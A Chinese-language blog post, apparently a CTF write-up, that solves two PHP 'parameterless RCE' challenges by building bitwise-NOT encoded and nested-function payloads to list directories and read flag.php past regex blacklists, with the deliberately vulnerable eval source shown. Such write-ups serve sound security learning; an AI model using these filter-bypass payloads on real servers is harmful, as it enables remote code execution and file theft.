<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.1.1">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">
  <meta name="google-site-verification" content="https://yoyo2yong.xyz">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"www.yoyo2tong.xyz","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="title :几道关于无参数的题Guojingning源码 12345678910  &lt;?phpshow_source(__FILE__);    $code &#x3D; $_GET[&amp;#x27;code&amp;#x27;];    if(strlen($code) &gt; 70 or preg_match(&amp;#x27;&#x2F;[A-Za-z0-9]|\&amp;#x27;|&quot;|&#96;|\ |,|\.|-|\">
<meta property="og:type" content="article">
<meta property="og:title" content="zoey">
<meta property="og:url" content="http://www.yoyo2tong.xyz/2021/01/31/Guojingning/index.html">
<meta property="og:site_name" content="zoey">
<meta property="og:description" content="title :几道关于无参数的题Guojingning源码 12345678910  &lt;?phpshow_source(__FILE__);    $code &#x3D; $_GET[&amp;#x27;code&amp;#x27;];    if(strlen($code) &gt; 70 or preg_match(&amp;#x27;&#x2F;[A-Za-z0-9]|\&amp;#x27;|&quot;|&#96;|\ |,|\.|-|\">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/5.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/6.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/7.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/8.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/9.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/10.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/11.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/12.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/13.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/14.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/15.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/16.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/17.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/18.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/19.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/20.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/21.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/22.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/23.png">
<meta property="og:image" content="c:/Users/Administrator/Desktop/pithur/24.png">
<meta property="article:published_time" content="2021-01-30T16:10:33.674Z">
<meta property="article:modified_time" content="2021-01-30T16:10:33.675Z">
<meta property="article:author" content="zoey">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:/Users/Administrator/Desktop/pithur/5.png">

<link rel="canonical" href="http://www.yoyo2tong.xyz/2021/01/31/Guojingning/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title> | zoey</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="alternate" href="/atom.xml" title="zoey" type="application/atom+xml">
</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">zoey</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">请多指教！</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-sitemap">

    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2021/01/31/Guojingning/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/1.jpg">
      <meta itemprop="name" content="zoey">
      <meta itemprop="description" content="Hello!">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="zoey">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-01-31 00:10:33" itemprop="dateCreated datePublished" datetime="2021-01-31T00:10:33+08:00">2021-01-31</time>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <hr>
<h2 id="title-几道关于无参数的题"><a href="#title-几道关于无参数的题" class="headerlink" title="title :几道关于无参数的题"></a>title :几道关于无参数的题</h2><h3 id="Guojingning"><a href="#Guojingning" class="headerlink" title="Guojingning"></a>Guojingning</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code) &gt; <span class="number">70</span> <span class="keyword">or</span> preg_match(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Your Guojingming&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $code))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>($code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>查看源码中第一个过滤中还可以利用的字符，发现<code>~</code>，和<code>()</code>都没有被过滤，想到可以利用取反</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\5.png" alt="5"></p>
<p>但是由于第二个过滤，<code>\</code>表示将下一个字符标记符、或一个向后引用、或一个八进制转义符。例如，”\n”匹配\n。”\n”匹配换行符。即相当于多种编程语言中都有的”转义字符”的概念。所以这道题中的<code>\(\)</code>表示匹配<code>(</code>和<code>)</code>。</p>
<p><code>\s</code>表示出现空白就匹配，<code>^</code>匹配输入字行首，<code>?</code>匹配前面的字表达式零次或一次。</p>
<p>[a-z]    匹配所有的小写字母</p>
<p>[A-Z]    匹配所有的大写字母</p>
<p>[a-zA-Z]   匹配所有的字母</p>
<p>[0-9]               匹配所以的数字，句子和减号</p>
<p>因为<code>[^,]</code>匹配除了逗号之外的任何字符，所以<code>[^\s\(\)]</code>是匹配除了空格，（ 和 ）以外的所有字符。</p>
<p>（?R)是引用当前表达式的意思，例如\w+((?R)?)，可以用\w+((?R)?)替换到(?R)的位置，因此可以衍生成匹配\w+(\w+((?R)?))、\w+(\w+(\w+((?R)?)))、等等。(?R)? 这里多一个?表示可以有引用，也可以没有。所以在这道题中<code>?\((?R)?\)/</code>, <code>\(</code>表示匹配(，<code>\)</code>表示匹配），第二个过滤表示匹配到函数就会被替换为空，最后只剩下<code>;</code>就可以执行eval语句。</p>
<p>根据给出的提示，php二维数组能够构造字符串</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\6.png" alt="6"></p>
<p>首先构造读取当前目录的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(pos(localeconv())));</span><br><span class="line"></span><br><span class="line">[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]())));</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\Desktop\pithur\7.png" alt="7"></p>
<p>发现该目录上不存在flag文件，读取上一层目录文件看看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(getcwd())));</span><br><span class="line"></span><br><span class="line">?code&#x3D;[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%9B%96%8D%91%9E%92%9A][!%FF]([~%98%9A%8B%9C%88%9B][!%FF]())));</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\Desktop\pithur\8.png" alt="8"></p>
<p>发现也不存在flag文件，读取当前所在的目录名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(dirname(getcwd()));</span><br><span class="line"></span><br><span class="line">?code&#x3D;[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%9B%96%8D%91%9E%92%9A][!%FF]([~%98%9A%8B%9C%88%9B][!%FF]()));</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\Desktop\pithur\9.png" alt="9"></p>
<p>我们知道<code>var/www/html</code>是Apache的默认路径，源码保存在<code>var/www/index.php</code>中，在<code>var/www</code>目录下没有找到flag，在<code>var</code>目录下也没有flag。</p>
<h4 id="一些函数的用法："><a href="#一些函数的用法：" class="headerlink" title="一些函数的用法："></a>一些函数的用法：</h4><p><strong>scandir()</strong>    列出目录中的文件和目录<br>用法：scandir(directory,sorting_order,context);<br>directory                必需，规定要扫描的目录<br>sorting_order            可选，默认是0，表示按字母升序排列；设置为1，表示按字母降序排列</p>
<p>context              可选。<em>context</em> 是可修改目录流的行为的一套选项。</p>
<p>当传入的参数是(‘.’)时，也就是scandir(‘.’),可以读取当前目录中的文件和目录，同理，当传入（../)时，可以读取上一层目录中的文件和目录。</p>
<p><strong>localeconv()函数</strong>    函数返回一包含本地数字及货币格式信息的数组。</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\10.png" alt="10"></p>
<p>可以看到第一个元素为点，我们可以使用pos()，current()构造出这个点。</p>
<p>所以<code>var_dump(scandir(pos(localeconv())));</code>读取当前目录中的目录和文件。</p>
<p><strong>dirname()函数</strong>，返回路径中的目录部分。</p>
<p>语法：dirname(path)</p>
<p>path参数是一个包含了指向一个文件的全路径的字符串。该函数返回去掉最后一个文件或目录后的目录名。</p>
<p><strong>getcwd()函数</strong>   获取当前工作目录。</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\11.png" alt="11"></p>
<p>所以<code>var_dump(scandir(dirname(getcwd())));</code>可以读取上一个目录中的目录和文件名。</p>
<p>尝试使用<code>scandir(../../)</code>返回上上层目录文件和文件名。                                                      </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回当前目录</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\Desktop\pithur\12.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回上一级目录</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\Desktop\pithur\13.png" alt="13"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">返回上上级目录</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\Desktop\pithur\14.png" alt="14"></p>
<p>根据php二维数组能够构造字符串，构造payload</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\15.png" alt="15"></p>
<p>构造payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%D1%D1%D0][!%FF]));</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\Administrator\Desktop\pithur\16.png" alt="16"></p>
<p>发现在没有过滤的条件下可以执行。</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\17.png" alt="17"></p>
<p>也可以绕过第一个过滤。</p>
<p>但是第二个过滤不能绕过，仔细分析第二个过滤，发现这就是一个无参数RCE的绕过！！！(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）scandir函数传入了参数，所以不能通过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(pos(localeconv())))  &#x2F;&#x2F;可以使用</span><br><span class="line">var_dump(scandir(&#39;.&#39;))  &#x2F;&#x2F;不能使用</span><br></pre></td></tr></table></figure>

<p>顺便把海啸杯的无参数RCE复习一下</p>
<h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>\w等价于[A-Za-z0-9]</p>
<p>第一个过滤可以看出只能传入无参数RCE，</p>
<p>首先构造读取当前目录文件，</p>
<p>因为scandir()函数没有被过滤，想到可以利用scandir(‘.’)函数读取文件目录，但是scandir(‘.’)函数不满足无参数RCE的形式，所以我们需要构造这个点。</p>
<p>利用localeconv() 取点，localeconv() 会返回当地的金融信息的数组，而第一个元素即为点，构造方法只需取第一个元素即可 pos()、current() 均可。</p>
<p>又因为pos被过滤，所以使用current函数来构造点，所以使用<code>scandir(current(localconv()))</code>来构造点。</p>
<p>常用PHP输出函数有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;<span class="comment">//只能打印字符串</span></span><br><span class="line">print_r(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//能够打印数组和字符串</span></span><br><span class="line">var_dump(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//能够打印数组和字符串同时输出打印内容的数据类型</span></span><br><span class="line">var_export(<span class="string">&quot;hello world!&quot;</span>,<span class="literal">true</span>);<span class="comment">//能够将字符串转换为php代码，第二个参数设置为true能够返回值</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hello world!&quot;</span>);<span class="comment">//结束程序并打印内容</span></span><br><span class="line"><span class="keyword">print</span>()函数输出一个或多个字符串。</span><br><span class="line">printf()函数，输出格式化的字符串</span><br><span class="line">sprintf()函数，把百分号（%）符号替换成一个作为参数进行传递的变量</span><br></pre></td></tr></table></figure>

<p>因为输出scandir(‘.’)的内容为数组，所以我们需要寻找可以打印数组的字符串。</p>
<p>发现有print_r，var_dump都可以打印数组，但是在这道题中，print_r和var_dump都被过滤了</p>
<p>到这里就没有思路了，看wp发现可以利用file_get_contents函数</p>
<p><code>file_get_contents()函数</code></p>
<p>把整个文件读入一个字符串中，和file()一样，不同的是file_get_contents()把文件读入一个字符串。</p>
<p>例子</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个函数可以打开文件，输入的文件名为字符串的形式。我们本来想要找的是一个打印数组的函数，那这个file_get_contents函数可以怎么利用？</p>
<p>到这里还不是很能理解，先利用这道题没有对大小写字母进行严格的过滤进行操作，这道题目过滤了var，我们可以把其中一个字母该为大写，例如Var_dump，vArdump，vaRdump来操作。</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\18.png" alt="18"></p>
<p>可以看到当前目录下存在flag.php，但是该文件存在于目录的中间位置。开始的想法是打乱数组，找到了一个shuffle()函数，该函数随机排列数组单元的顺序（将数组打乱）并为数组中的单元赋予新的键名，删除原有的键名。</p>
<p>若成功，则返回ture，否则返回false。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="number">1</span>, <span class="string">&quot;b&quot;</span>=&gt;<span class="number">2</span>, <span class="string">&quot;c&quot;</span>=&gt;<span class="number">3</span>, <span class="string">&quot;d&quot;</span>=&gt;<span class="number">4</span>, <span class="string">&quot;e&quot;</span>=&gt;<span class="number">5</span>);</span><br><span class="line">shuffle($arr);  <span class="comment">//打乱数组</span></span><br><span class="line">print_r($arr);  <span class="comment">//输出Array([0] =&gt; 5 [1] =&gt; 2 [2] =&gt; 1 [3] =&gt; 4 [4] =&gt; 3)</span></span><br><span class="line">print_r(shuffle($arr));<span class="comment">//输出1  （true）</span></span><br><span class="line">shuffle(<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="number">111</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="number">222</span>));<span class="comment">//报错</span></span><br></pre></td></tr></table></figure>

<p>可以看出，这个函数并不适合无参数rce。</p>
<p>找到另外一个随机函数，array_rand()函数。</p>
<p><code>array_rand()函数</code></p>
<p>返回数组中的随机键名，从数组中随机选出一个或多个元素，并返回。</p>
<p>第二个参数用来确定要选出几个元素。如果规定函数返回不只一个键名，则返回包含随机键名的数组。函数从数组中随机选出一个或多个元素，并返回。</p>
<p>array_rand(array,number)</p>
<p>可以看出，返回一个键名符合无参数rce的要求。</p>
<p>但是，这个函数返回的是键名，而键值“flag.php”才是我们的目的，想到了反转数组，可以利用array_flip()函数。</p>
<p><code>array_flip()函数</code></p>
<p>反转数组中所有的键以及它们关联的值。</p>
<p>这样，我们就可以通过反转数组和array_rand()函数得到我们想要的flag.php字段。</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\19.png" alt="19"></p>
<p>先通过反转数组，再通过array_rand()函数返回数组中的随机键值，当输出flag.php时即为我们想要得到的内容。</p>
<p>我们可以看出，当输出flag.php是以字符串的形式输出的。</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\20.png" alt="20"></p>
<p>到这里我们就可以联想到file_get_contents函数的用法，我们可以使用file_get_contents(flag.php)来读取flag.php的内容。通过返回的页面为空白和no我们测试，空白的原因是因为输出的文件是没有内容的，输出no的原因通过观察源码我们可以得到，是因为输出的文件内容里含有flag字符。</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\21.png" alt="21"></p>
<p>可以想到利用编码来绕过这个过滤，第一个想到的是base64编码，但是base被过滤，因为过滤不严格，可以用大写字母绕过，解码可得flag。</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\22.png" alt="22"></p>
<p>当过滤严格，不能使用大写绕过时，可以用bin2hex编码</p>
<p><img src="C:\Users\Administrator\Desktop\pithur\23.png" alt="23"></p>
<p><img src="C:\Users\Administrator\Desktop\pithur\24.png" alt="24"></p>

    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/01/30/cat/" rel="prev" title="无判断字符，基于运行时错误的bool盲注">
      <i class="fa fa-chevron-left"></i> 无判断字符，基于运行时错误的bool盲注
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#title-%E5%87%A0%E9%81%93%E5%85%B3%E4%BA%8E%E6%97%A0%E5%8F%82%E6%95%B0%E7%9A%84%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">title :几道关于无参数的题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Guojingning"><span class="nav-number">1.1.</span> <span class="nav-text">Guojingning</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E4%BA%9B%E5%87%BD%E6%95%B0%E7%9A%84%E7%94%A8%E6%B3%95%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">一些函数的用法：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="nav-number">1.2.</span> <span class="nav-text">无参数RCE</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="zoey"
      src="/images/1.jpg">
  <p class="site-author-name" itemprop="name">zoey</p>
  <div class="site-description" itemprop="description">Hello!</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">15</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      博客链接
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="http://www.yoyo2tong.xyz/" title="http:&#x2F;&#x2F;www.yoyo2tong.xyz&#x2F;">myblog</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zoey</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">81k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:14</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>


  















  

  

</body>
</html>
